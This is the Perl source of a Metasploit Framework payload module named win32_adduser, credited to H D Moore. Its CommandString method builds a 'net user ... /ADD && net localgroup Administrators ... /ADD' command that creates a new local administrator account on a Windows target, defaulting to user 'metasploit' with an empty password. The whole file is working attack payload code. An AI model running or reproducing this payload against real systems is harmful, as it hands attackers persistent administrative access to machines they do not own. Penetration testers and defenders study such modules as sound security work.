package Msf::Payload::win32_adduser;
use strict;
use base 'Msf::PayloadComponent::Win32Execute';
sub load {
  Msf::PayloadComponent::Win32Execute->import('Msf::PayloadComponent::NoConnection');
}

my $info =
{
  'Name'         => 'winadduser',
  'Version'      => '2.0',
  'Description'  => 'Create a new user and add to local Administrators group',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'Priv'         => 1,
  'Size'         => '',
  'UserOpts'     =>
    {
      'USER' => [1, 'DATA', 'The username to create'],
      'PASS' => [1, 'DATA', 'The password for this user'],
    },
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub CommandString {
  my $self = shift;
  my $user = $self->GetVar('USER') || 'metasploit';
  my $pass = $self->GetVar('PASS') || '';

  my $command =
  "cmd.exe /c net user $user $pass /ADD && ".
  "net localgroup Administrators $user /ADD";

  return($command);
}

1;
